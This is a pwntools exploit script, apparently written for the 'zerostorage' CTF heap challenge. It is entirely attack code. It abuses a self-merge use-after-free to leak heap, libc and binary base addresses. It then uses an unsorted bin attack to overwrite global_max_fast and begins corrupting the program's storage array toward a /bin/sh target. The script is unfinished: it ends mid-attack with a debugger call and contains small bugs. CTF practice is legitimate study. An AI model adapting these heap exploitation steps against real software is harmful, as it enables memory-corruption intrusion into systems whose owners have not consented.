from pwn import *
zero = ELF('./zerostorage')
if args['REMOTE']:
    p = remote('111', 111)
else:
    p = process('./zerostorage')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'


def insert(length, data):
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.sendline(str(length))
    p.recvuntil('Enter your data:')
    p.send(data)


def update(entryid, length, data):
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('Entry ID: ')
    p.sendline(str(entryid))
    p.recvuntil('Length of entry: ')
    p.sendline(str(length))
    p.recvuntil('Enter your data: ')
    p.sendline(data)


def merge(fro, to):
    p.recvuntil('Your choice: ')
    p.sendline('3')
    p.recvuntil('Merge from Entry ID: ')
    p.sendline(str(fro))
    p.recvuntil('Merge to Entry ID: ')
    p.sendline(str(to))


def delete(entryid):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.sendline(str(entryid))


def view(entryid):
    p.recvuntil('Your choice: ')
    p.sendline('5')
    p.sendline('str(entryid)')


def list():
    p.recvuntil('Your choice: ')
    p.sendline('6')


# get libc base addr in one debug cycle, but the offset won't change
libc_base_debug = 0x7f97cf38f000
unsorted_bin_offset = 0x7f97cf753b78 - libc_base_debug
free_hook_offset = libc.symbols['__free_hook']
global_max_fast_offset = 0x7f97cf7557f8 - libc_base_debug
binsh_offset = next(libc.search('/bin/sh'))
# the given binary offset related to libc base
zero_offset = 0x55b6e867e000 - libc_base_debug
# the storage array(bss) offset
storage_arr_offset = 0x203060

insert(8, 'A' * 8)  # 0
insert(8, 'B' * 8)  # 0,1
insert(8, 'C' * 8)  # 0,1,2
insert(8, 'D' * 8)  # 0,1,2,3
insert(0x90, 'E' * 0x90)  # 0,1,2,3,4

#gdb.attach(p)
delete(0)  #1,2,3,4

# merge the same entry 2 to let entry 2 to be inserted into unsorted bin
# and now it is unsortedbin<--->2<--->0
merge(2, 2)  # 0,1,3,4

view('5')
p.recvuntil('Entry No.0:\n')

heap = u64(p.recvn(8))
log.success('get heap addr: ' + hex(heap))
unsorted_bin = u64(p.recvn(8))
log.success('get unsortedbin addr: ' + hex(unsorted_bin))
libc_base = unsorted_bin - unsorted_bin_offset
log.success('get libc base addr: ' + hex(libc_base))
free_hook = libc_base + free_hook_offset
log.success('get free hook addr: ' + hex(free_hook))
global_max_fast = libc_base + global_max_fast_offset
log.success('get global_max_fast addr: ' + hex(global_max_fast))
binsh = libc_base + binsh_offset
log.success('get /binb/sh addr: ' + hex(binsh))
zero_base = libc_base + zero_offset
log.success('get zerostorage base addr: ' + hex(zero_base))
storage_arr = zero_base + storage_arr_offset
log.success('get storage array addr: ' + hex(storage_arr))

# retrive the last chunk in unsortedbin, which is original chunk 0
# and now unsortedbin<-->2
insert(8, 'x' * 8)  # 0,1,2,3,4

# use unsorted bin attack to create a fake at global_max_fast -0x10
# and now unsortedbin-->global_max_fast-0x10
update(0, 16, 'a' * 8 + p64(global_max_fast - 0x10))

# retrive the last chunk in unsortedbin, which is a fake chunk
# and since so we set global_max_fast = &unsortedbin
# it is a very big value
insert(8, 'deadbeef')  #0,1,2,3,4

# generate
merge(3, 3)  # 0,1,2,4,5
gdb.attach(p)
update(5, 8, p64(storage_arr + 24 * 4))  #

insert(8, 'deadbeef')  # 0,1,2,3,4,5

insert(8, 'H' * 8)
